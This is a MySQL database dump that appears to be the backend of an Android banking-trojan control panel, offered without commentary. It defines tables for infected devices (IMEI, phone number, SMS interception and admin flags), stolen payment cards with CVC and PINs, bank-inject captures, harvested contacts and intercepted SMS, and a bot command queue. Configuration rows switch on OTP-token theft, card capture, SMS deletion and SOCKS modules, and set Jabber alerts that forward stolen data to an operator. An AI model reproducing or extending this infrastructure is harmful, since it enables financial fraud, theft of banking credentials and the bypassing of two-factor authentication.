SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;


CREATE TABLE IF NOT EXISTS `apps` (
`id` int(11) NOT NULL,
  `name` varchar(255) NOT NULL,
  `total_count` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

CREATE TABLE IF NOT EXISTS `bots` (
`id` int(11) NOT NULL,
  `bot_id` varchar(36) NOT NULL,
  `timestamp` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `registered` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `is_intercept` tinyint(1) NOT NULL DEFAULT '0',
  `comment` varchar(100) NOT NULL DEFAULT '',
  `imei` varchar(50) NOT NULL DEFAULT '',
  `country` char(2) NOT NULL DEFAULT '',
  `operator` varchar(20) NOT NULL DEFAULT '',
  `android` varchar(8) NOT NULL DEFAULT '',
  `model` varchar(200) NOT NULL DEFAULT '',
  `number` varchar(20) NOT NULL,
  `ip` varchar(15) NOT NULL,
  `marked_at` timestamp NULL DEFAULT NULL COMMENT 'Manually marked',
  `tag` varchar(32) NOT NULL DEFAULT '',
  `is_sms_default_app` tinyint(1) NOT NULL DEFAULT '0',
  `is_admin` tinyint(1) NOT NULL DEFAULT '0',
  `lang` varchar(5) NOT NULL DEFAULT '',
  `is_screen_enabled` tinyint(1) NOT NULL DEFAULT '0',
  `phone_time` int(11) NOT NULL DEFAULT '0'
) ENGINE=InnoDB AUTO_INCREMENT=478 DEFAULT CHARSET=utf8;

CREATE TABLE IF NOT EXISTS `bot_apps` (
`id` int(11) NOT NULL,
  `bot_id` varchar(32) NOT NULL,
  `app_id` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

CREATE TABLE IF NOT EXISTS `bot_banks` (
`id` int(11) NOT NULL,
  `inject_id` int(11) NOT NULL,
  `bot_id` varchar(32) NOT NULL,
  `data` mediumtext NOT NULL,
  `ts` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `comment` varchar(256) NOT NULL DEFAULT ''
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

CREATE TABLE IF NOT EXISTS `bot_cards` (
`id` int(11) NOT NULL,
  `bot_id` varchar(32) NOT NULL,
  `number` varchar(20) NOT NULL,
  `month` varchar(2) NOT NULL,
  `year` varchar(2) NOT NULL,
  `cvc` varchar(4) NOT NULL,
  `ts` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `comment` varchar(256) NOT NULL,
  `birthday` varchar(8) NOT NULL,
  `pay_pass` varchar(32) NOT NULL DEFAULT '',
  `full_name` varchar(128) NOT NULL DEFAULT '',
  `address` varchar(128) NOT NULL DEFAULT '',
  `zip` varchar(16) NOT NULL DEFAULT '',
  `phone` varchar(16) NOT NULL DEFAULT '',
  `sort` varchar(32) NOT NULL DEFAULT '',
  `account_number` varchar(32) NOT NULL DEFAULT '',
  `got_steps` int(11) NOT NULL DEFAULT '0'
) ENGINE=InnoDB AUTO_INCREMENT=25 DEFAULT CHARSET=utf8;

CREATE TABLE IF NOT EXISTS `bot_contacts` (
`id` int(11) NOT NULL,
  `bot_id` varchar(32) NOT NULL,
  `data` text NOT NULL,
  `comment` text
) ENGINE=InnoDB AUTO_INCREMENT=117 DEFAULT CHARSET=utf8;

CREATE TABLE IF NOT EXISTS `bot_sms` (
`id` int(11) NOT NULL,
  `bot_id` varchar(32) NOT NULL,
  `text` varchar(300) NOT NULL,
  `number` varchar(20) NOT NULL,
  `date` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `ts` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB AUTO_INCREMENT=1314 DEFAULT CHARSET=utf8;

CREATE TABLE IF NOT EXISTS `bot_tasks` (
`id` int(11) NOT NULL,
  `bot_id` varchar(32) NOT NULL,
  `command` text NOT NULL,
  `status` enum('pending','in_work','done_success','done_failed','cancelled') NOT NULL,
  `response` varchar(512) NOT NULL,
  `ts_start` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `ts_end` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

CREATE TABLE IF NOT EXISTS `config` (
`id` int(11) NOT NULL,
  `name` varchar(128) NOT NULL,
  `value` mediumtext NOT NULL
) ENGINE=InnoDB AUTO_INCREMENT=643 DEFAULT CHARSET=utf8;

INSERT INTO `config` (`id`, `name`, `value`) VALUES
(5, 'mod_socks', '0'),
(6, 'mod_contacts', '0'),
(7, 'mod_cardtan', '1'),
(8, 'mod_otp_tokens', '1'),
(9, 'wanted_apps_list', ''),
(10, 'cc_on_apps_list', 'com.cc_on.1\ncom.cc_on.2\ncom.cc_on.3\ncom.whatsapp'),
(11, 'minimize_apps_list', 'com.minimize.1\ncom.minimize.2\ncom.minimize.3\niii'),
(12, 'domains_list', 'domain1\ndomain2\ndomain3\nsaul.org\nhill.cc'),
(13, 'data_version', '23'),
(14, 'folder', 'panel2'),
(15, 'last_login', 'admin'),
(19, 'jabber_password', 'taeta'),
(605, 'mass_sms_urls_list', ''),
(629, 'jabber_login', ''),
(630, 'jabber_pass', ''),
(631, 'jabber_server', 'jabb.ru'),
(632, 'jabber_port', '5222'),
(633, 'jabber_rcp', 'sdfsdf@thesecure.df'),
(634, 'jabber_on_cards', '1'),
(635, 'jabber_on_banks', '1'),
(636, 'jabber_on_sms', '1'),
(637, 'jabber_on_tokens', '1'),
(638, 'jabber_on_coords', '1'),
(639, 'jabber_notifies_type', 'full'),
(640, 'jabber_sms_numbers', '05550000'),
(641, 'mod_sms_deleter', '0'),
(642, 'mod_light', '0');

CREATE TABLE IF NOT EXISTS `injects` (
`id` int(11) NOT NULL,
  `inject_id` int(11) NOT NULL,
  `active` tinyint(1) NOT NULL DEFAULT '1'
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

CREATE TABLE IF NOT EXISTS `users` (
`id` int(11) NOT NULL,
  `login` varchar(64) NOT NULL,
  `password` varchar(32) NOT NULL,
  `sessid` varchar(32) NOT NULL,
  `status` varchar(32) NOT NULL DEFAULT 'active'
) ENGINE=InnoDB AUTO_INCREMENT=10 DEFAULT CHARSET=utf8;

INSERT INTO `users` (`id`, `login`, `password`, `sessid`, `status`) VALUES
(1, 'admin', '', '', 'active');


ALTER TABLE `apps`
 ADD PRIMARY KEY (`id`), ADD UNIQUE KEY `name` (`name`);

ALTER TABLE `bots`
 ADD PRIMARY KEY (`id`), ADD UNIQUE KEY `api` (`tag`,`timestamp`,`android`,`comment`,`operator`,`country`), ADD UNIQUE KEY `bot_id` (`bot_id`);

ALTER TABLE `bot_apps`
 ADD PRIMARY KEY (`id`), ADD KEY `bot_id` (`bot_id`,`app_id`);

ALTER TABLE `bot_banks`
 ADD PRIMARY KEY (`id`), ADD KEY `client_id` (`inject_id`,`bot_id`);

ALTER TABLE `bot_cards`
 ADD PRIMARY KEY (`id`), ADD KEY `bot_id` (`bot_id`), ADD KEY `bot_id_2` (`bot_id`), ADD KEY `bot_id_3` (`bot_id`), ADD KEY `bot_id_4` (`bot_id`), ADD KEY `bot_id_5` (`bot_id`), ADD KEY `bot_id_6` (`bot_id`);

ALTER TABLE `bot_contacts`
 ADD PRIMARY KEY (`id`), ADD UNIQUE KEY `bot_id` (`bot_id`), ADD KEY `comment` (`comment`(128));

ALTER TABLE `bot_sms`
 ADD PRIMARY KEY (`id`), ADD KEY `bot_id` (`bot_id`,`text`(255),`number`), ADD KEY `bot_id_2` (`bot_id`,`text`(255),`number`), ADD KEY `bot_id_3` (`bot_id`,`text`(255),`number`), ADD KEY `bot_id_4` (`bot_id`,`text`(255),`number`), ADD KEY `bot_id_5` (`bot_id`,`text`(255),`number`), ADD KEY `bot_id_6` (`bot_id`,`text`(255),`number`);

ALTER TABLE `bot_tasks`
 ADD PRIMARY KEY (`id`), ADD KEY `bot_id` (`bot_id`,`status`);

ALTER TABLE `config`
 ADD PRIMARY KEY (`id`), ADD UNIQUE KEY `name` (`name`);

ALTER TABLE `injects`
 ADD PRIMARY KEY (`id`);

ALTER TABLE `users`
 ADD PRIMARY KEY (`id`);


ALTER TABLE `apps`
MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
ALTER TABLE `bots`
MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=478;
ALTER TABLE `bot_apps`
MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
ALTER TABLE `bot_banks`
MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
ALTER TABLE `bot_cards`
MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=25;
ALTER TABLE `bot_contacts`
MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=117;
ALTER TABLE `bot_sms`
MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=1314;
ALTER TABLE `bot_tasks`
MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
ALTER TABLE `config`
MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=643;
ALTER TABLE `injects`
MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
ALTER TABLE `users`
MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=10;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
